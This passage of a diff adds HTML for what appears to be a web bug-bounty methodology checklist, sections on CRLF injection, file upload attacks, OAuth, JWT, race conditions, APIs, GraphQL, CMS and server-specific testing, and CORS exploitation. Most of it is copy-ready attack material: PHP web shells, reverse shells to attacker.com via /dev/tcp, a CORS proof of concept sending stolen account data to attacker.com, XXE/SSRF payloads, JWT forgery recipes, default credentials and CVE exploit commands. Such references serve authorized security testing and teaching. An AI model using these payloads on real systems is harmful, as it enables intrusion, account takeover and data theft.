+https://example.com/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a&lt;script&gt;alert(document.domain)&lt;/script&gt;
+https://example.com/%0aLocation:http://attacker.com
+https://subDomain.microsoft.com/嘍嘊Set-Cookie:whoami=thecyberneh嘍嘊嘍嘊嘍嘊嘼script嘾alert(1);嘼/script嘾</code></pre></div>
+        <div class="info-box tip"><span class="info-icon">💡</span><div>CRLF can be used for HTTP response splitting, header injection, XSS, and cache poisoning. Test in all redirect/URL parameters.</div></div>
+      </div>
+    </section>
+
+    <!-- ==================== SECTION 26 ==================== -->
+    <section class="methodology-section" id="sec-26">
+      <div class="section-header">
+        <span class="section-num">26</span>
+        <span class="section-title">File Upload Attacks</span>
+        <button class="section-complete-btn">Mark Done</button>
+        <span class="section-toggle">▼</span>
+      </div>
+      <div class="section-body">
+
+        <div class="subsection">
+          <div class="subsection-title">PHP Shell Upload</div>
+          <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">php</span><button class="copy-btn"></button></div><pre><code>&lt;?php system($_GET['cmd']); ?&gt;
+&lt;?php echo shell_exec($_REQUEST['cmd']); ?&gt;
+&lt;?php passthru($_GET['cmd']); ?&gt;</code></pre></div>
+        </div>
+
+        <div class="subsection">
+          <div class="subsection-title">Extension Bypass Techniques</div>
+          <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">text</span><button class="copy-btn"></button></div><pre><code># Double extension
+shell.php.jpg
+shell.jpg.php
+shell.php%00.jpg
+
+# Case variation
+shell.PHP
+shell.Php5
+shell.pHp
+
+# Alternate PHP extensions
+shell.php3
+shell.php4
+shell.php5
+shell.php7
+shell.phtml
+shell.pht
+shell.phpt
+
+# MIME type bypass
+Content-Type: image/jpeg (but file is PHP)
+
+# Magic bytes bypass
+Add GIF89a; before PHP code: GIF89a;&lt;?php system($_GET['cmd']); ?&gt;</code></pre></div>
+        </div>
+
+        <div class="subsection">
+          <div class="subsection-title">SVG XSS</div>
+          <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">svg</span><button class="copy-btn"></button></div><pre><code>&lt;?xml version="1.0" standalone="no"?&gt;
+&lt;!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN"
+  "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"&gt;
+&lt;svg onload="alert(document.domain)" xmlns="http://www.w3.org/2000/svg"&gt;
+&lt;/svg&gt;</code></pre></div>
+        </div>
+
+        <div class="subsection">
+          <div class="subsection-title">PDF XSS</div>
+          <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">text</span><button class="copy-btn"></button></div><pre><code># Inject JavaScript in PDF
+# Using pdflatex or PDF metadata
+app.alert("XSS in PDF")</code></pre></div>
+        </div>
+
+        <div class="subsection">
+          <div class="subsection-title">Blind SSRF via File Upload</div>
+          <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">xml</span><button class="copy-btn"></button></div><pre><code>&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;
+&lt;!DOCTYPE foo [
+  &lt;!ELEMENT foo ANY&gt;
+  &lt;!ENTITY xxe SYSTEM "http://attacker.com/ssrf"&gt;
+]&gt;
+&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</code></pre></div>
+        </div>
+
+        <div class="subsection">
+          <div class="subsection-title">Reverse Shell via Upload</div>
+          <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">php</span><button class="copy-btn"></button></div><pre><code>&lt;?php exec("/bin/bash -c 'bash -i &gt;& /dev/tcp/attacker.com/4444 0&gt;&amp;1'"); ?&gt;</code></pre></div>
+        </div>
+
+        <div class="subsection">
+          <div class="subsection-title">crossdomain.xml &amp; PUT Method</div>
+          <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">bash</span><button class="copy-btn"></button></div><pre><code># Upload crossdomain.xml for Flash SWF exploitation
+# PUT method upload
+curl -X PUT https://example.com/uploads/shell.php -d '&lt;?php system($_GET["cmd"]); ?&gt;'</code></pre></div>
+        </div>
+
+      </div>
+    </section>
+
+    <!-- ==================== SECTION 27 ==================== -->
+    <section class="methodology-section" id="sec-27">
+      <div class="section-header">
+        <span class="section-num">27</span>
+        <span class="section-title">DOM Invader</span>
+        <button class="section-complete-btn">Mark Done</button>
+        <span class="section-toggle">▼</span>
+      </div>
+      <div class="section-body">
+        <p>DOM Invader by PortSwigger helps find DOM-based vulnerabilities automatically.</p>
+        <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">url</span><button class="copy-btn"></button></div><pre><code>https://portswigger-labs.net/dom-invader/</code></pre></div>
+        <ul>
+          <li>Enable DOM Invader in Burp Suite browser</li>
+          <li>It injects canary values and tracks where they flow</li>
+          <li>Tests: DOM XSS, postMessage vulnerabilities, prototype pollution, open redirect</li>
+          <li>Works with Single Page Applications (Angular, React, Vue)</li>
+        </ul>
+      </div>
+    </section>
+
+    <!-- ==================== SECTION 28 ==================== -->
+    <section class="methodology-section" id="sec-28">
+      <div class="section-header">
+        <span class="section-num">28</span>
+        <span class="section-title">OAuth Attacks</span>
+        <button class="section-complete-btn">Mark Done</button>
+        <span class="section-toggle">▼</span>
+      </div>
+      <div class="section-body">
+        <div class="subsection">
+          <div class="subsection-title">redirect_uri Bypass</div>
+          <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">url</span><button class="copy-btn"></button></div><pre><code># Open redirect chain
+?redirect_uri=https://example.com/callback/../../../attacker.com
+
+# Subdomain confusion
+?redirect_uri=https://attacker.example.com/callback
+
+# Path manipulation
+?redirect_uri=https://example.com/callback?nextUrl=https://attacker.com
+
+# Fragment bypass
+?redirect_uri=https://attacker.com#https://example.com/callback
+
+# Double URL encoding
+?redirect_uri=https://example.com%2F%2Fattacker.com</code></pre></div>
+        </div>
+
+        <div class="subsection">
+          <div class="subsection-title">CSRF via OAuth &amp; Token Leakage</div>
+          <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">text</span><button class="copy-btn"></button></div><pre><code># Missing state parameter = CSRF
+# Craft: https://provider.com/oauth?client_id=X&redirect_uri=https://attacker.com/callback&response_type=code&state=MISSING
+
+# Token in Referer
+# Access token can leak in Referer header if the callback page loads 3rd party resources
+
+# Access token in URL fragment
+# Use fragment identifier to capture token
+# https://attacker.com/callback#access_token=TOKEN</code></pre></div>
+        </div>
+
+        <div class="subsection">
+          <div class="subsection-title">Login Bypass via OAuth</div>
+          <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">text</span><button class="copy-btn"></button></div><pre><code># If email not verified in OAuth flow:
+# 1. Create attacker account on OAuth provider with victim's email (unverified)
+# 2. Use that OAuth account to log into target app
+# 3. App trusts email claim, grants access to victim's account</code></pre></div>
+        </div>
+
+      </div>
+    </section>
+
+    <!-- ==================== SECTION 29 ==================== -->
+    <section class="methodology-section" id="sec-29">
+      <div class="section-header">
+        <span class="section-num">29</span>
+        <span class="section-title">JWT Attacks</span>
+        <button class="section-complete-btn">Mark Done</button>
+        <span class="section-toggle">▼</span>
+      </div>
+      <div class="section-body">
+
+        <div class="subsection">
+          <div class="subsection-title">None Algorithm Attack</div>
+          <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">bash</span><button class="copy-btn"></button></div><pre><code># Change algorithm to none and remove signature
+# Header: {"alg":"none","typ":"JWT"}
+# Encode and send with empty signature (trailing dot)
+eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9.</code></pre></div>
+        </div>
+
+        <div class="subsection">
+          <div class="subsection-title">Brute Force Secret</div>
+          <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">bash</span><button class="copy-btn"></button></div><pre><code>hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
+# or using jwt-cracker
+jwt-cracker -t TOKEN -a [a-zA-Z0-9]</code></pre></div>
+        </div>
+
+        <div class="subsection">
+          <div class="subsection-title">JWK / JKU Parameter Injection</div>
+          <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">json</span><button class="copy-btn"></button></div><pre><code>// JWK header injection - embed your own public key
+{
+  "alg": "RS256",
+  "typ": "JWT",
+  "jwk": {
+    "kty": "RSA",
+    "kid": "attacker-key",
+    "n": "...your public key modulus...",
+    "e": "AQAB"
+  }
+}
+
+// JKU - point to attacker-controlled URL with JWK set
+{
+  "alg": "RS256",
+  "jku": "https://attacker.com/.well-known/jwks.json"
+}</code></pre></div>
+        </div>
+
+        <div class="subsection">
+          <div class="subsection-title">kid Parameter Attacks</div>
+          <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">text</span><button class="copy-btn"></button></div><pre><code># SQLi via kid
+kid: ' UNION SELECT 'attacker-secret' --
+
+# Path traversal via kid
+kid: ../../dev/null
+# Sign with empty string as secret</code></pre></div>
+        </div>
+
+        <div class="subsection">
+          <div class="subsection-title">Algorithm Confusion (RS256 to HS256)</div>
+          <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">bash</span><button class="copy-btn"></button></div><pre><code># Obtain public key
+# Change algorithm to HS256
+# Sign JWT using public key as HMAC secret
+python3 -c "
+import jwt, base64
+pub_key = open('public.pem').read()
+payload = {'sub': 'admin', 'role': 'admin'}
+token = jwt.encode(payload, pub_key, algorithm='HS256')
+print(token)"</code></pre></div>
+        </div>
+
+      </div>
+    </section>
+
+    <!-- ==================== SECTION 30 ==================== -->
+    <section class="methodology-section" id="sec-30">
+      <div class="section-header">
+        <span class="section-num">30</span>
+        <span class="section-title">Session Attacks</span>
+        <button class="section-complete-btn">Mark Done</button>
+        <span class="section-toggle">▼</span>
+      </div>
+      <div class="section-body">
+        <ul>
+          <li><strong>Session Fixation:</strong> Attacker sets a known session ID before victim logs in</li>
+          <li><strong>Session Hijacking:</strong> Steal session via XSS, MITM, or network sniffing</li>
+          <li><strong>Improper Invalidation:</strong> Old session still valid after logout</li>
+          <li><strong>Session Token in URL:</strong> Leaked via Referer, logs, and browser history</li>
+          <li><strong>Weak Session Token:</strong> Predictable or sequential token generation</li>
+          <li><strong>Concurrent Sessions:</strong> No limit on simultaneous sessions from different IPs</li>
+        </ul>
+        <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">bash</span><button class="copy-btn"></button></div><pre><code># Check session token entropy
+echo -n "SESSION_TOKEN" | base64 -d | xxd | head
+
+# Test session fixation
+curl -c cookies.txt https://example.com/login  # Get session
+# Then log in — check if session ID changes after authentication</code></pre></div>
+      </div>
+    </section>
+
+    <!-- ==================== SECTION 31 ==================== -->
+    <section class="methodology-section" id="sec-31">
+      <div class="section-header">
+        <span class="section-num">31</span>
+        <span class="section-title">IDOR &amp; Business Logic</span>
+        <button class="section-complete-btn">Mark Done</button>
+        <span class="section-toggle">▼</span>
+      </div>
+      <div class="section-body">
+        <div class="subsection">
+          <div class="subsection-title">Autorize Extension Setup</div>
+          <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">text</span><button class="copy-btn"></button></div><pre><code># Burp > Extensions > Autorize
+# Add low-privilege user's session cookie
+# Browse app as high-privilege user
+# Autorize replays all requests with low-priv cookie
+# Highlights "Bypassed!" in green when access control fails</code></pre></div>
+        </div>
+
+        <div class="subsection">
+          <div class="subsection-title">IDOR Scenarios</div>
+          <ul>
+            <li>GET /api/user/<strong>1234</strong>/profile → change to 1235</li>
+            <li>GET /invoice/<strong>INV-001</strong> → try INV-002, INV-003</li>
+            <li>DELETE /api/posts/<strong>GUID</strong> → enumerate other post GUIDs</li>
+            <li>GET /api/admin/users → horizontal privilege escalation</li>
+            <li>PUT /api/user/1234/role → send <code>{"role":"admin"}</code></li>
+            <li>Password reset via IDOR: <code>/reset?token=USER_ID</code></li>
+            <li>File download: <code>/download?file=report_1.pdf</code> → <code>report_2.pdf</code></li>
+          </ul>
+        </div>
+
+        <div class="subsection">
+          <div class="subsection-title">Invitation Abuse</div>
+          <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">text</span><button class="copy-btn"></button></div><pre><code># 1. Invite attacker's email to organization
+# 2. Accept invitation but change account to victim's email before acceptance
+# 3. Or: forward invitation link, modify token to grant access to different org</code></pre></div>
+        </div>
+
+      </div>
+    </section>
+
+    <!-- ==================== SECTION 32 ==================== -->
+    <section class="methodology-section" id="sec-32">
+      <div class="section-header">
+        <span class="section-num">32</span>
+        <span class="section-title">Race Condition</span>
+        <button class="section-complete-btn">Mark Done</button>
+        <span class="section-toggle">▼</span>
+      </div>
+      <div class="section-body">
+
+        <div class="subsection">
+          <div class="subsection-title">Turbo Intruder (Burp)</div>
+          <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">python</span><button class="copy-btn"></button></div><pre><code>def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint,
+                          concurrentConnections=30,
+                          requestsPerConnection=100,
+                          pipeline=True)
+    for i in range(30):
+        engine.queue(target.req, target.baseInput, gate='race1')
+    engine.openGate('race1')
+
+def handleResponse(req, interesting):
+    table.add(req)</code></pre></div>
+        </div>
+
+        <div class="subsection">
+          <div class="subsection-title">cURL Parallel Technique</div>
+          <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">bash</span><button class="copy-btn"></button></div><pre><code># Parallel requests with xargs
+seq 1 20 | xargs -P 20 -I {} curl -s -X POST \
+  -b "session=TOKEN" \
+  -d "coupon=DISCOUNT20" \
+  https://example.com/apply-coupon
+
+# Race condition scenarios:
+# - Apply same coupon multiple times
+# - Transfer money to yourself simultaneously
+# - Register same username from two sessions
+# - Exceed invitation limits
+# - Double-spend credits/points</code></pre></div>
+        </div>
+
+      </div>
+    </section>
+
+    <!-- ==================== SECTION 33 ==================== -->
+    <section class="methodology-section" id="sec-33">
+      <div class="section-header">
+        <span class="section-num">33</span>
+        <span class="section-title">API Testing</span>
+        <button class="section-complete-btn">Mark Done</button>
+        <span class="section-toggle">▼</span>
+      </div>
+      <div class="section-body">
+        <div class="subsection">
+          <div class="subsection-title">Kiterunner - API Bruteforce</div>
+          <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">bash</span><button class="copy-btn"></button></div><pre><code>kr scan https://example.com -w routes-large.kite
+kr scan https://example.com -w wordlist.txt -x 10
+kr brute https://example.com -w /path/to/wordlist.txt</code></pre></div>
+        </div>
+        <div class="subsection">
+          <div class="subsection-title">API Fuzzing</div>
+          <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">bash</span><button class="copy-btn"></button></div><pre><code># ffuf for API endpoints
+ffuf -u https://api.example.com/FUZZ -w api-wordlist.txt -mc 200,201,204
+
+# arjun for parameter discovery
+arjun -u https://api.example.com/endpoint --get
+
+# Try version bumping
+/api/v1/users  ->  /api/v2/users  ->  /api/v3/users
+/api/v1/admin  (access control on v1 but not v2?)
+
+# HTTP verb tampering
+GET /api/users  -> POST /api/users -> PUT /api/users -> DELETE /api/users</code></pre></div>
+        </div>
+        <div class="subsection">
+          <div class="subsection-title">Prototype Pollution via API</div>
+          <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">json</span><button class="copy-btn"></button></div><pre><code>{"__proto__": {"admin": true}}
+{"constructor": {"prototype": {"admin": true}}}
+{"__proto__.isAdmin": "true"}</code></pre></div>
+        </div>
+        <div class="subsection">
+          <div class="subsection-title">RapidAPI &amp; API Discovery</div>
+          <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">text</span><button class="copy-btn"></button></div><pre><code>https://rapidapi.com/hub
+https://www.postman.com/explore
+https://apis.guru/
+# Search for leaked API docs: site:example.com "api" "swagger" OR "openapi"</code></pre></div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ==================== SECTION 34 ==================== -->
+    <section class="methodology-section" id="sec-34">
+      <div class="section-header">
+        <span class="section-num">34</span>
+        <span class="section-title">Swagger-UI Testing</span>
+        <button class="section-complete-btn">Mark Done</button>
+        <span class="section-toggle">▼</span>
+      </div>
+      <div class="section-body">
+        <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">bash</span><button class="copy-btn"></button></div><pre><code># BishopFox sj tool - Swagger/OpenAPI testing
+https://github.com/BishopFox/sj
+sj -u https://example.com/api-docs -o output.txt
+
+# Common Swagger UI paths
+/swagger
+/swagger-ui
+/swagger-ui.html
+/api-docs
+/api/swagger
+/v1/api-docs
+/swagger/index.html
+/openapi.json
+/api/swagger.json</code></pre></div>
+        <div class="info-box tip"><span class="info-icon">💡</span><div>Look for endpoints that are documented but not properly secured. Admin-only endpoints are often exposed in Swagger without auth.</div></div>
+      </div>
+    </section>
+
+    <!-- ==================== SECTION 35 ==================== -->
+    <section class="methodology-section" id="sec-35">
+      <div class="section-header">
+        <span class="section-num">35</span>
+        <span class="section-title">GraphQL Testing</span>
+        <button class="section-complete-btn">Mark Done</button>
+        <span class="section-toggle">▼</span>
+      </div>
+      <div class="section-body">
+        <div class="subsection">
+          <div class="subsection-title">Introspection Query</div>
+          <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">graphql</span><button class="copy-btn"></button></div><pre><code>{
+  __schema {
+    types {
+      name
+      fields {
+        name
+        type { name kind }
+      }
+    }
+  }
+}</code></pre></div>
+        </div>
+        <div class="subsection">
+          <div class="subsection-title">graphw00f Fingerprinting</div>
+          <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">bash</span><button class="copy-btn"></button></div><pre><code>python3 graphw00f.py -d https://example.com/graphql
+# Identifies the GraphQL engine in use</code></pre></div>
+        </div>
+        <div class="subsection">
+          <div class="subsection-title">GraphQL Voyager</div>
+          <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">url</span><button class="copy-btn"></button></div><pre><code>https://graphql-voyager.com/
+# Paste introspection result to visualize schema</code></pre></div>
+        </div>
+        <div class="subsection">
+          <div class="subsection-title">SQLi via GraphQL</div>
+          <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">graphql</span><button class="copy-btn"></button></div><pre><code>{
+  user(id: "1 OR 1=1") {
+    username
+    email
+  }
+}
+
+# Batch query DoS / info leak
+{ user(id: 1) { pass } }
+{ user(id: 2) { pass } }
+# Send both in one request</code></pre></div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ==================== SECTION 36 ==================== -->
+    <section class="methodology-section" id="sec-36">
+      <div class="section-header">
+        <span class="section-num">36</span>
+        <span class="section-title">Technology-Specific Testing</span>
+        <button class="section-complete-btn">Mark Done</button>
+        <span class="section-toggle">▼</span>
+      </div>
+      <div class="section-body">
+
+        <div class="subsection">
+          <div class="subsection-title">WordPress</div>
+          <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">bash</span><button class="copy-btn"></button></div><pre><code>wpscan --url https://example.com --enumerate p,t,u
+wpscan --url https://example.com -e ap --plugins-detection aggressive
+wpscan --url https://example.com --api-token YOUR_TOKEN
+
+# xmlrpc.php SSRF
+curl -d @- https://example.com/xmlrpc.php &lt;&lt;EOF
+&lt;?xml version="1.0"?&gt;
+&lt;methodCall&gt;&lt;methodName&gt;pingback.ping&lt;/methodName&gt;
+&lt;params&gt;&lt;param&gt;&lt;value&gt;http://attacker.com/ssrf&lt;/value&gt;&lt;/param&gt;
+&lt;param&gt;&lt;value&gt;https://example.com/&lt;/value&gt;&lt;/param&gt;
+&lt;/params&gt;&lt;/methodCall&gt;
+EOF
+
+# User enumeration
+https://example.com/?author=1
+https://example.com/wp-json/wp/v2/users</code></pre></div>
+        </div>
+
+        <div class="subsection">
+          <div class="subsection-title">Joomla</div>
+          <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">bash</span><button class="copy-btn"></button></div><pre><code>droopescan scan joomla -u https://example.com
+joomlascan -u https://example.com</code></pre></div>
+        </div>
+
+        <div class="subsection">
+          <div class="subsection-title">Drupal</div>
+          <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">bash</span><button class="copy-btn"></button></div><pre><code>droopescan scan drupal -u https://example.com
+# Drupalgeddon2 - CVE-2018-7600
+python3 drupalgeddon2.py https://example.com
+# Node fuzzing
+ffuf -u https://example.com/node/FUZZ -w nums.txt -mc 200</code></pre></div>
+        </div>
+
+        <div class="subsection">
+          <div class="subsection-title">Tomcat</div>
+          <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">text</span><button class="copy-btn"></button></div><pre><code># Default credentials
+admin:admin
+admin:password
+tomcat:tomcat
+manager:manager
+admin:tomcat
+
+# Manager endpoints
+/manager/html
+/host-manager/html
+
+# Upload malicious WAR via manager for RCE</code></pre></div>
+        </div>
+
+        <div class="subsection">
+          <div class="subsection-title">AEM (Adobe Experience Manager)</div>
+          <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">bash</span><button class="copy-btn"></button></div><pre><code># aem_hacker tool
+python3 aem_hacker.py -u https://example.com --host attacker.com
+
+# Sensitive paths
+/etc/passwd.json
+/etc/keys.json
+/.json
+/home/users/admin/.json
+/crx/de/index.jsp
+/system/console/bundles
+/etc/clientlibs/.json</code></pre></div>
+        </div>
+
+        <div class="subsection">
+          <div class="subsection-title">Elasticsearch</div>
+          <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">bash</span><button class="copy-btn"></button></div><pre><code>curl https://example.com:9200/
+curl https://example.com:9200/_cat/indices
+curl https://example.com:9200/_all/_search?pretty
+curl https://example.com:9200/INDEX_NAME/_search?pretty</code></pre></div>
+        </div>
+
+        <div class="subsection">
+          <div class="subsection-title">Jira</div>
+          <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">bash</span><button class="copy-btn"></button></div><pre><code># Jira-Lens
+python3 jira-lens.py -u https://jira.example.com
+
+# CVEs to test
+# CVE-2019-8451 - SSRF via /plugins/servlet/gadgets/makeRequest
+# CVE-2020-14179 - Info disclosure /secure/QueryComponent!Default.jspa
+# CVE-2022-0540 - Auth bypass
+
+# Endpoints
+/rest/api/2/project
+/rest/auth/1/session
+/secure/ConfigurePortalPages!default.jspa?view=popular
+/rest/api/2/serverInfo
+
+# Username enumeration
+/rest/api/2/user/picker?query=a</code></pre></div>
+        </div>
+
+        <div class="subsection">
+          <div class="subsection-title">Jenkins</div>
+          <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">bash</span><button class="copy-btn"></button></div><pre><code># CVE-2024-23897 - LFI via CLI
+java -jar jenkins-cli.jar -s http://jenkins.example.com:8080/ help "@/etc/passwd"
+
+# Script console RCE
+# /script endpoint
+println "id".execute().text
+
+# Reverse shell via script console
+def cmd = "bash -i >&amp; /dev/tcp/attacker.com/4444 0>&amp;1"
+["bash", "-c", cmd].execute()</code></pre></div>
+        </div>
+
+        <div class="subsection">
+          <div class="subsection-title">Firebase</div>
+          <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">bash</span><button class="copy-btn"></button></div><pre><code># Check for unauthenticated access
+curl https://PROJECT.firebaseio.com/.json
+# Try /.json?shallow=true for large databases</code></pre></div>
+        </div>
+
+        <div class="subsection">
+          <div class="subsection-title">Splunk</div>
+          <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">bash</span><button class="copy-btn"></button></div><pre><code># Info disclosure
+https://example.com:8000/en-US/splunkd/__raw/services/server/info?output_mode=json</code></pre></div>
+        </div>
+
+        <div class="subsection">
+          <div class="subsection-title">AngularJS Template Injection</div>
+          <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">html</span><button class="copy-btn"></button></div><pre><code>{{7*7}}
+{{constructor.constructor('alert(1)')()}}
+{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}
+&lt;div ng-app ng-csp&gt;{{$eval.constructor('alert(1)')()}}&lt;/div&gt;</code></pre></div>
+        </div>
+
+      </div>
+    </section>
+
+    <!-- ==================== SECTION 37 ==================== -->
+    <section class="methodology-section" id="sec-37">
+      <div class="section-header">
+        <span class="section-num">37</span>
+        <span class="section-title">Local Storage Checks</span>
+        <button class="section-complete-btn">Mark Done</button>
+        <span class="section-toggle">▼</span>
+      </div>
+      <div class="section-body">
+        <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">javascript</span><button class="copy-btn"></button></div><pre><code>// Check localStorage
+Object.keys(localStorage).forEach(k => console.log(k, localStorage.getItem(k)));
+
+// Check sessionStorage
+Object.keys(sessionStorage).forEach(k => console.log(k, sessionStorage.getItem(k)));
+
+// Check cookies
+document.cookie
+
+// Check IndexedDB
+indexedDB.databases().then(dbs => console.log(dbs))</code></pre></div>
+        <ul>
+          <li>Look for JWT tokens stored in localStorage (vulnerable to XSS theft)</li>
+          <li>Look for API keys, secrets, PII stored client-side</li>
+          <li>Check for sensitive data in browser cache</li>
+          <li>Test if tokens in localStorage are validated server-side</li>
+        </ul>
+      </div>
+    </section>
+
+    <!-- ==================== SECTION 38 ==================== -->
+    <section class="methodology-section" id="sec-38">
+      <div class="section-header">
+        <span class="section-num">38</span>
+        <span class="section-title">EXIF Data Check</span>
+        <button class="section-complete-btn">Mark Done</button>
+        <span class="section-toggle">▼</span>
+      </div>
+      <div class="section-body">
+        <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">url</span><button class="copy-btn"></button></div><pre><code>https://jimpl.com/</code></pre></div>
+        <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">bash</span><button class="copy-btn"></button></div><pre><code>exiftool image.jpg
+exiftool -r -ext jpg /path/to/directory/
+# Look for: GPS coordinates, author info, software versions, device info</code></pre></div>
+      </div>
+    </section>
+
+    <!-- ==================== SECTION 39 ==================== -->
+    <section class="methodology-section" id="sec-39">
+      <div class="section-header">
+        <span class="section-num">39</span>
+        <span class="section-title">Directory Fuzzing</span>
+        <button class="section-complete-btn">Mark Done</button>
+        <span class="section-toggle">▼</span>
+      </div>
+      <div class="section-body">
+        <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">bash</span><button class="copy-btn"></button></div><pre><code># dirsearch
+dirsearch -u https://example.com/
+dirsearch -u https://example.com/ -e php,asp,aspx,jsp,html,zip,bak
+dirsearch -u https://example.com/ -w /path/to/wordlist.txt -t 50
+dirsearch -u https://example.com/ --exclude-status 404,403
+dirsearch -l domains.txt -e php -o results.txt
+
+# ffuf
+ffuf -u https://www.example.com/FUZZ -w wordlists -t 1000
+ffuf -u https://example.com/FUZZ -w wordlist.txt -mc 200,204,301,302 -o ffuf.json
+ffuf -u https://example.com/api/FUZZ -w api-endpoints.txt
+
+# kiterunner
+kr scan -u https://www.example.com -w wordlist.kite
+kr scan https://example.com -A=apiroutes-220828:20000
+
+# gobuster
+gobuster dir -u https://example.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
+
+# feroxbuster
+feroxbuster -u https://example.com -w wordlist.txt --depth 3</code></pre></div>
+      </div>
+    </section>
+
+    <!-- ==================== SECTION 40 ==================== -->
+    <section class="methodology-section" id="sec-40">
+      <div class="section-header">
+        <span class="section-num">40</span>
+        <span class="section-title">Static Page Testing</span>
+        <button class="section-complete-btn">Mark Done</button>
+        <span class="section-toggle">▼</span>
+      </div>
+      <div class="section-body">
+        <ul class="checklist">
+          <li><label><input type="checkbox"> <span>Check page source for commented-out credentials or endpoints</span></label></li>
+          <li><label><input type="checkbox"> <span>Inspect all form fields including hidden inputs</span></label></li>
+          <li><label><input type="checkbox"> <span>Look for debug parameters: <code>?debug=true</code>, <code>?test=1</code></span></label></li>
+          <li><label><input type="checkbox"> <span>Check robots.txt for disallowed paths</span></label></li>
+          <li><label><input type="checkbox"> <span>Check sitemap.xml for all endpoints</span></label></li>
+          <li><label><input type="checkbox"> <span>Look for .DS_Store and Thumbs.db files</span></label></li>
+          <li><label><input type="checkbox"> <span>Test backup files: index.php.bak, config.php~</span></label></li>
+          <li><label><input type="checkbox"> <span>Check for exposed .git, .svn, .hg directories</span></label></li>
+          <li><label><input type="checkbox"> <span>Look for staging/dev versions of the application</span></label></li>
+          <li><label><input type="checkbox"> <span>Check for verbose error messages with stack traces</span></label></li>
+        </ul>
+      </div>
+    </section>
+
+    <!-- ==================== SECTION 41 ==================== -->
+    <section class="methodology-section" id="sec-41">
+      <div class="section-header">
+        <span class="section-num">41</span>
+        <span class="section-title">CORS Exploitation</span>
+        <button class="section-complete-btn">Mark Done</button>
+        <span class="section-toggle">▼</span>
+      </div>
+      <div class="section-body">
+        <div class="subsection">
+          <div class="subsection-title">CORS Detection</div>
+          <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">bash</span><button class="copy-btn"></button></div><pre><code>curl -H "Origin: https://attacker.com" -I https://api.example.com/user/data
+# Check for: Access-Control-Allow-Origin: https://attacker.com
+# Check for: Access-Control-Allow-Credentials: true</code></pre></div>
+        </div>
+        <div class="subsection">
+          <div class="subsection-title">Origin Bypass Variants</div>
+          <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">text</span><button class="copy-btn"></button></div><pre><code>Origin: https://example.com.attacker.com
+Origin: https://attacker.com/example.com
+Origin: null
+Origin: https://example.com%60attacker.com
+Origin: https://evil-example.com
+Origin: https://sub.example.com (if wildcards used)</code></pre></div>
+        </div>
+        <div class="subsection">
+          <div class="subsection-title">CORS Exploit PoC</div>
+          <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">html</span><button class="copy-btn"></button></div><pre><code>&lt;html&gt;
+&lt;body&gt;
+&lt;script&gt;
+  var xhr = new XMLHttpRequest();
+  xhr.onreadystatechange = function() {
+    if (this.readyState == 4) {
+      fetch('https://attacker.com/steal?d=' + btoa(this.responseText));
+    }
+  };
+  xhr.open('GET', 'https://api.victim.com/account/details', true);
+  xhr.withCredentials = true;
+  xhr.send();
+&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre></div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ==================== SECTION 42 ==================== -->
+    <section class="methodology-section" id="sec-42">
+      <div class="section-header">
+        <span class="section-num">42</span>
+        <span class="section-title">Clickjacking</span>
+        <button class="section-complete-btn">Mark Done</button>
+        <span class="section-toggle">▼</span>
+      </div>
+      <div class="section-body">
